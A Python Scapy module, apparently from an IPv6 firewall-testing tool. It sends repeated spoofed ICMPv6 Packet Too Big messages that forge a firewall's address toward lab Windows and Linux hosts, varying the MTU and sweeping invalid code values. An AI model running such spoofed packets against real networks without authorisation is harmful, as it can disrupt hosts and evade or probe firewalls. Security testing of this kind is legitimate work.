#!/usr/bin/python

from scapy.all import *

"""
the class build Destination Unreachable messages
"""
class PacketTooBig:
    
    def __init__(self):
        print 'Packet Too Big'
        self.win = "2001:abcd:acad:2:b485:2aec:9447:fd83"
        self.linux = "2001:abcd:acad:2:a00:27ff:fe84:bb37"
        self.attacker = "2001:abcd:acad:1::2"
        self.firewall = "2001:abcd:acad:2::1"

    def execModulePacketTooBigMTUBigWin(self, exitIface):
        for x in range(0, 50):
            data = "abcdefghijklmnopqrstuvwabcdefghi"
            packetContainer = IPv6(dst=self.win,src=self.firewall)/ICMPv6PacketTooBig(mtu=2000)/IPv6(dst=self.attacker,src=self.win,hlim=128)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModulePacketTooBigMTUBigLinux(self, exitIface):
        for x in range(0, 50):
            data = "abcdefghijklmnopqrstuvwabcdefghi"
            packetContainer = IPv6(dst=self.linux,src=self.firewall)/ICMPv6PacketTooBig(mtu=2000)/IPv6(dst=self.attacker,src=self.linux,hlim=64)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModulePacketTooBigMTUSmallWin(self, exitIface):
        for x in range(0, 50):
            data = "abcdefghijklmnopqrstuvwabcdefghi"
            packetContainer = IPv6(dst=self.win,src=self.firewall)/ICMPv6PacketTooBig(mtu=500)/IPv6(dst=self.attacker,src=self.win,hlim=128)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModulePacketTooBigMTUSmallLinux(self, exitIface):
        for x in range(0, 50):
            data = "abcdefghijklmnopqrstuvwabcdefghi"
            packetContainer = IPv6(dst=self.linux,src=self.firewall)/ICMPv6PacketTooBig(mtu=500)/IPv6(dst=self.attacker,src=self.linux,hlim=64)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModulePacketTooBigMTUWin(self, exitIface):
        for x in range(0, 50):
            data = "abcdefghijklmnopqrstuvwabcdefghi"
            packetContainer = IPv6(dst=self.win,src=self.firewall)/ICMPv6PacketTooBig(mtu=1300)/IPv6(dst=self.attacker,src=self.win,hlim=128)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModulePacketTooBigMTULinux(self, exitIface):
        for x in range(0, 50):
            data = "abcdefghijklmnopqrstuvwabcdefghi"
            packetContainer = IPv6(dst=self.linux,src=self.firewall)/ICMPv6PacketTooBig(mtu=1300)/IPv6(dst=self.attacker,src=self.linux,hlim=64)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModulePacketTooBigBadCodeWin(self, exitIface):
        for code in range(1, 256):
            data = "abcdefghijklmnopqrstuvwabcdefghi"
            packetContainer = IPv6(dst=self.win,src=self.firewall)/ICMPv6PacketTooBig(code=code)/IPv6(dst=self.attacker,src=self.win,hlim=128)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModulePacketTooBigBadCodeLinux(self, exitIface):
        for code in range(1, 256):
            data = "abcdefghijklmnopqrstuvwabcdefghi"
            packetContainer = IPv6(dst=self.linux,src=self.firewall)/ICMPv6PacketTooBig(code=code)/IPv6(dst=self.attacker,src=self.linux,hlim=64)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

        
